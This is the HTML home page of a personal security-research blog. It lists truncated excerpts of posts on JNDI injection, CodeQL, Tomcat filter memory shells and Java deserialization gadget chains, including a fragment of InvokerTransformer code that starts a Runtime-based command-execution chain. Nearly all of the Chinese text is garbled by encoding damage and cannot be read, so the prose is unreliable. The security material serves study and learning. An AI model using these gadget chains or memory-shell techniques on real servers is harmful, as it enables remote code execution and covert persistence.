<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>f4l1k_blog</title><meta name="author" content="f4l1k"><meta name="copyright" content="f4l1k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="f4l1k_blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="f4l1k_blog">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/konglong.jpg">
<meta property="article:author" content="f4l1k">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/konglong.jpg"><link rel="shortcut icon" href="/img/fav.png"><link rel="canonical" href="http://example.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'f4l1k_blog',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2021-12-29 14:39:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading();" title="ç‚¹å‡»è·³è¿‡åŠ¨ç”»"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="iron-container iron-circle"><div class="iron-box1 iron-circle iron-center"></div><div class="iron-box2 iron-circle iron-center"></div><div class="iron-box3 iron-circle iron-center"></div><div class="iron-box4 iron-circle iron-center"></div><div class="iron-box5 iron-circle iron-center"></div><div class="iron-box6 iron-circle"><div class="iron-coil" style="--i: 0"></div><div class="iron-coil" style="--i: 1"></div><div class="iron-coil" style="--i: 2"></div><div class="iron-coil" style="--i: 3"></div><div class="iron-coil" style="--i: 4"></div><div class="iron-coil" style="--i: 5"></div><div class="iron-coil" style="--i: 6"></div><div class="iron-coil" style="--i: 7"></div></div></div></div></a><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/konglong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/cover5.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">f4l1k_blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">f4l1k_blog</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/12/12/java_study/jndi%E6%B3%A8%E5%85%A5/" title="jndiæ³¨å…¥">     <img class="post_bg" src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="jndiæ³¨å…¥"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/12/java_study/jndi%E6%B3%A8%E5%85%A5/" title="jndiæ³¨å…¥">jndiæ³¨å…¥</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-12-12T11:19:50.000Z" title="å‘è¡¨äº 2021-12-12 19:19:50">2021-12-12</time></span></div><div class="content">å‰è¨€å‰æ®µæ—¶é—´è·Ÿç€Pç‰›å­¦äº†rmiï¼Œæœ€è¿‘åˆå‡ºäº†ä¸ªLog4j2æ ¸å¼¹æ¼æ´ï¼Œå°±æƒ³ç€è¦æŠŠjndiå­¦äº†ï¼Œæ¯•ç«Ÿç±»ä¼¼fastjsonã€shiroçš„æ¼æ´éƒ½ä¼šç”¨åˆ°ã€‚
jndiç®€ä»‹JNDI(Java Naming and Directory Interface)
æ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾—Javaåº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚é€šè¿‡è°ƒç”¨JNDIçš„APIåº”ç”¨ç¨‹åºå¯ä»¥å®šä½èµ„æºå’Œå…¶ä»–ç¨‹åºå¯¹è±¡ã€‚JNDIæ˜¯Java EEçš„é‡è¦éƒ¨åˆ†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å®ƒå¹¶ä¸åªæ˜¯åŒ…å«äº†DataSource(JDBC æ•°æ®æº)ï¼ŒJNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:DNSã€XNam ã€Novellç›®å½•æœåŠ¡ã€LDAP(Lightweight Directory Access Protocolè½»å‹ç›®å½•è®¿é—®åè®®)ã€ CORBAå¯¹è±¡æœåŠ¡ã€æ–‡ä»¶ç³»ç»Ÿã€Windows XP/2000/NT/Me/9xçš„æ³¨å†Œè¡¨ã€RMIã€DSML v1& ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/" title="codqlåˆæ¬¡å°è¯•">     <img class="post_bg" src="/img/cover5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="codqlåˆæ¬¡å°è¯•"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/" title="codqlåˆæ¬¡å°è¯•">codqlåˆæ¬¡å°è¯•</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-12-09T12:06:09.000Z" title="å‘è¡¨äº 2021-12-09 20:06:09">2021-12-09</time></span></div><div class="content">å‰è¨€è€æ˜¯çœ‹å¸ˆå‚…èŒä½¿ç”¨codeqlæ¥åšä»£ç å®¡è®¡ï¼Œå°èœé¸¡è¡¨ç¤ºä¹Ÿæƒ³å°è¯•å°è¯•ï¼Œåˆšå¥½ä¸€æ—¶å…´èµ·ï¼Œè¯´å¹²å°±å¹²ï¼
codeql ä»‹ç»CodeQLæ˜¯ä¸€ä¸ªåˆ†æå¼•æ“ï¼Œè¢«å¼€å‘äººå‘˜ç”¨æ¥è‡ªåŠ¨è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œä¹Ÿè¢«å®‰å…¨ç ”ç©¶äººå‘˜ç”¨æ¥è¿›è¡Œå˜ä½“åˆ†æã€‚
å¯¹åšå®‰å…¨çš„å¸ˆå‚…æ¥è¯´å…¶å®å°±æ˜¯å¸®åŠ©æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡
codeqlä½¿ç”¨å®‰è£…é¦–å…ˆå°†codeqlå·²ç»ç¼–è¯‘å¥½çš„ç¨‹åºä¸‹è½½åˆ°æœ¬åœ°
https://github.com/github/codeql-cli-binaries/releases 
å†å°†qlçš„è¯­è¨€å·¥å…·åŒ…ä¸‹è½½åˆ°æœ¬åœ°
https://github.com/Semmle/ql
ä¸ºäº†æ–¹ä¾¿å¯ä»¥å°†codeqlç›®å½•æ·»åŠ ä¸ºç¯å¢ƒå˜é‡
æ¥ç€æˆ‘ä»¬å»vscodeæ·»åŠ codeqlæ’ä»¶

å¹¶ç‚¹å‡»æ’ä»¶è®¾ç½®

å°†codeqlæ‰§è¡Œæ–‡ä»¶çš„å¯æ‰§è¡Œæ–‡ä»¶ç›®å½•å¡«å…¥
ä½¿ç”¨æˆ‘ä»¬å‚è€ƒl4yn3 çš„æ–‡ç« ä½¿ç”¨javaçš„é¶åœºhttps://github.com/l4yn3/micro_service_seclab/ï¼ˆæœ¬æ¥æƒ³å†™goçš„ï¼Œä½†æ˜¯ä¸ç†Ÿæ‚‰goï¼ŒèœğŸ”è¿˜æ˜¯æ”¾å¼ƒäº†ï¼‰
é¦–å…ˆå°†åŸæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¹¶ä½¿ç”¨codeqlç¼–è¯‘
ç¼–è¯‘ä¹‹å‰è¦å°†æ•°æ®åº“æ–‡ä»¶å¯¼å…¥ï¼Œå¹¶ä¸”å°†mybatisé…ç½®ä»¥åŠapplication. ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/12/04/java_study/java-day9/" title="filter å†…å­˜é©¬">     <img class="post_bg" src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="filter å†…å­˜é©¬"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/04/java_study/java-day9/" title="filter å†…å­˜é©¬">filter å†…å­˜é©¬</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-12-04T08:20:17.000Z" title="å‘è¡¨äº 2021-12-04 16:20:17">2021-12-04</time></span></div><div class="content">filter å†…å­˜é©¬ä¸Šä¸€ç¯‡æˆ‘ä»¬ä»‹ç»äº†ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚
æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨å†…å­˜é©¬è‚¯å®šä¸èƒ½å»ServletContextListenerä¸­åŠ¨æ€æ³¨å†Œï¼Œæˆ‘ä»¬åŸºæœ¬èŒèƒ½åœ¨servletä¸­ç¼–è¾‘æˆ–è€…ä¸Šä¼ jspç±»çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•å®ç°å†…å­˜é©¬å‘¢
è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å»åˆ†æä¸€ä¸‹åŠ è½½filterçš„æµç¨‹

æˆ‘ä»¬éœ€è¦å…ˆçŸ¥é“å‡ ä¸ªå˜é‡å’Œç±»
FilterDefsï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯
FilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯
FilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern
FilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter
WebXmlï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»
ContextConfigï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»
StandardContextï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œ ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/11/27/java_study/java_day8/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰">     <img class="post_bg" src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/27/java_study/java_day8/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-11-27T05:55:46.000Z" title="å‘è¡¨äº 2021-11-27 13:55:46">2021-11-27</time></span></div><div class="content">å†…å­˜é©¬(åŸºç¡€çŸ¥è¯†)å‰è¨€å‰é¢æˆ‘è·ŸéšPç‰›çš„è„šæ­¥çœ‹äº†ä¸€äº›ååºåˆ—åŒ–ï¼Œå½“ç„¶è¿˜æœ‰å¾ˆå¤šé“¾æ²¡æœ‰è·Ÿç€åˆ†æï¼Œå¯èƒ½è€ƒè™‘åé¢å†æ¥ç€è·Ÿã€‚ä»Šå¤©å¼€å§‹æ‰“ç®—å¯¹javaå†…å­˜é©¬è¿›è¡Œä¸€ä¸ªç³»ç»ŸåŒ–çš„å­¦ä¹ ï¼Œå¹¶è®°å½•ä¸€äº›å­¦ä¹ è¿‡ç¨‹ä¸­çš„çŸ¥è¯†ç‚¹ã€‚
å†…å­˜é©¬æ˜¯ä¸€ç§æ— æ–‡ä»¶è½åœ°é©¬ï¼Œç›¸å¯¹äºåŸæ¥çš„æ™®é€šæœ¨é©¬æœ‰éšè”½æ€§å¼ºçš„ç‰¹ç‚¹ï¼ŒåŸæ¥çš„æœ¨é©¬ç”±äºæ–°webshellæ£€æµ‹æŠ€æœ¯ä¹Ÿæ›´å®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œéšç€å†°èçš„java agent ç±»å‹çš„å†…å­˜é©¬å‡ºç°ï¼Œå†…å­˜é©¬åˆå‡ºç°åœ¨å¤§ä¼—çš„çœ¼ä¸­ã€‚
ç›®å‰ä¸»è¦çš„å†…å­˜é©¬æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š

åŠ¨æ€æ³¨å†Œ servlet/filter/listenerï¼ˆä½¿ç”¨ servlet-api çš„å…·ä½“å®ç°ï¼‰
åŠ¨æ€æ³¨å†Œ interceptor/controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring/struts2ï¼‰
åŠ¨æ€æ³¨å†Œä½¿ç”¨èŒè´£é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline &amp; Valveï¼ŒGrizzly çš„ FilterChain &amp; Filter ç­‰ç­‰ï¼‰
ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç 

åŸºç¡€ä»‹ç»servletservletä»‹ç»å€Ÿç”¨èœé¸Ÿæ•™ç¨‹çš„ä»‹ç»ï¼š

Java Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Š ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/11/21/java_study/java_day7/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰">     <img class="post_bg" src="/img/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/21/java_study/java_day7/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-11-21T11:18:23.000Z" title="å‘è¡¨äº 2021-11-21 19:18:23">2021-11-21</time></span></div><div class="content">day7â€”åŠ¨æ€åŠ è½½å­—èŠ‚ç 
ClassLoader æ˜¯ä»€ä¹ˆå‘¢?å®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„ ClassLoader å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚ java.lang.Runtime ã€‚

URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶
URLClassLoaderç»§æ‰¿äºSecureClassLoaderï¼Œæ”¯æŒä»jaræ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¸­è·å–classï¼Œç»§æ‰¿äºClassLoaderï¼ŒåŠ è½½æ—¶é¦–å…ˆå»ClassLoaderé‡Œåˆ¤æ–­æ˜¯å¦ç”±å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½è¿‡ã€‚
javaä¼šæ ¹æ®é…ç½®é¡¹sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆæˆ‘ä»¬è®¾ç½®çš„ClassPathå’Œä»å…¶ä»–é€”å¾„å¯¼å…¥çš„)


URLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯» æ‰¾.classæ–‡ä»¶

URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶

URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸº ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/11/18/java_study/java_day6/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆCommonsCollections6ï¼‰">     <img class="post_bg" src="/img/cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆCommonsCollections6ï¼‰"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/18/java_study/java_day6/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆCommonsCollections6ï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆCommonsCollections6ï¼‰</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-11-18T12:28:23.000Z" title="å‘è¡¨äº 2021-11-18 20:28:23">2021-11-18</time></span></div><div class="content">day6â€”ååºåˆ—åŒ–ï¼ˆCommonsCollections6ï¼‰æˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« çœ‹è¿‡äº†CC1çš„é“¾ï¼Œæˆ‘ä»¬ç»§ç»­è·ŸéšPç‰›çš„è¿›åº¦ï¼Œæ¥çœ‹çœ‹CC6ï¼Œè¿™æ¡é“¾ä¸»è¦æ˜¯ä¸ºäº†è§£å†³æˆ‘ä»¬æ‰€è¯´çš„åœ¨é«˜ç‰ˆæœ¬JDKä¸­æ— æ³•ä½¿ç”¨AnnotationInvocationHandlerï¼Œæˆ‘ä»¬é¦–å…ˆè¿˜æ˜¯çœ‹ä¸€çœ‹Pç‰›ç®€åŒ–å‡ºæ¥çš„é“¾
12345678910111213141516Gadget chain:     java.io.ObjectInputStream.readObject()           java.util.HashMap.readObject()               java.util.HashMap.hash()org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()       org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                      org.apache.commons.collections.map.LazyMap.get() ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/11/16/java_study/java_day5/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆlazyMapï¼‰">     <img class="post_bg" src="/img/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆlazyMapï¼‰"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/16/java_study/java_day5/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆlazyMapï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆlazyMapï¼‰</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-11-16T06:17:24.000Z" title="å‘è¡¨äº 2021-11-16 14:17:24">2021-11-16</time></span></div><div class="content">day5â€”ååºåˆ—åŒ–(lazyMap)lazyMapæˆ‘ä»¬æ¥ç€è·ŸéšPç‰›å­¦ä¹ ååºåˆ—åŒ–ã€‚å‰é¢Pç‰›ç»™æˆ‘ä»¬ä»‹ç»äº†åˆ©ç”¨TransformedMapå»æ„é€ CommonCollections1çš„åˆ©ç”¨é“¾ï¼Œä½†å½“æˆ‘ä»¬çœ‹åˆ°ysoserialä¸­æ—¶ï¼Œä¼šå‘ç°å®ƒå¹¶ä¸æ˜¯åˆ©ç”¨TransformedMapå»æ„é€ çš„ï¼ŒäºŒååˆ©ç”¨åˆ°äº†å¦ä¸€ä¸ªç±»lazyMap,é‚£æˆ‘ä»¬ä»Šå¤©å°±å»å­¦ä¹ å¦‚ä½•åˆ©ç”¨lazyMapå»æ„é€ ä¸€ä¸ªæ­£ç»çš„CommonCollections1åˆ©ç”¨é“¾
12345678ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] &#123; (Transformer)new ConstantTransformer(Integer.valueOf(1)) &#125;);Transformer[] transformers = &#123; (Transformer)new ConstantTransformer(Runtime.class), (Transformer)new InvokerTransformer(&quot;ge ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/11/02/java_study/java_day4/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆTransformedMapï¼‰">     <img class="post_bg" src="/img/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆTransformedMapï¼‰"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/02/java_study/java_day4/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆTransformedMapï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆTransformedMapï¼‰</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-11-02T10:22:17.000Z" title="å‘è¡¨äº 2021-11-02 18:22:17">2021-11-02</time></span></div><div class="content">day4â€”ååºåˆ—åŒ–(TransformedMap)å‰é¢æˆ‘ä»¬åªä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æŸäº›ç±»ä¸­çš„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ååºåˆ—åŒ–çš„å…³é”®åœ¨äºå¦‚ä½•å°†æœ€åçš„å¯¹è±¡ç”Ÿæˆä¸ºä¸€ä¸ªåºåˆ—åŒ–æµï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„POC
æˆ‘ä»¬è¯´è¿‡å½“ä¸€ä¸ªå¯¹è±¡ç”Ÿæˆåºåˆ—åŒ–æµçš„æ—¶å€™ä¼šè°ƒç”¨ç±»ä¸­çš„writeObjectæ–¹æ³•ï¼Œè€Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç±»
æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªåºåˆ—åŒ–æµçš„poc
